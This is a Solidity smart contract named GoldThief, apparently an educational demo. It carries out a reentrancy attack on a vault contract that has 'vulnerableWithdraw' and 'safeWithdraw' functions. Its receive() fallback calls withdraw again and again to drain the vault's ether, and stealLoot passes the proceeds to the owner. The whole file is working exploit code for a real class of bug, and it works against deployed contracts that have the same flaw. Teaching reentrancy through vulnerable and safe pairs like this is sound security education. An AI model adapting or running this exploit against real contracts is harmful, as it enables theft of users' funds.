
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


interface IVault{
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief{

    IVault public targetVault;
    address public owner;
    uint256 public attackCount;
    bool public attackingSafe;


    constructor(address _vaultAddress){
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable{
        require(msg.sender == owner, "Only owner can call this function");
        require(msg.value >= 1 ether, "Need to have atleast 1 ether to attack");
        attackingSafe = false;
        attackCount = 0;
       targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    receive() external payable { 
        attackCount++;
        if(!attackingSafe && address (targetVault).balance >= 1 ether && attackCount <5){
            targetVault.vulnerableWithdraw();
    }
    if(attackingSafe){
        targetVault.safeWithdraw();
    }
    
}

     function attackSafe() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= 1 ether, "Need atleast 1 ether to attack");
        attackingSafe = true;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
     }

     function stealLoot() external {
        require(msg.sender == owner, "Only owner can call this function");
        payable (owner).transfer(address(this).balance);
     }

     function getBalance() external view returns(uint256){
        return address(this).balance;
     }

}

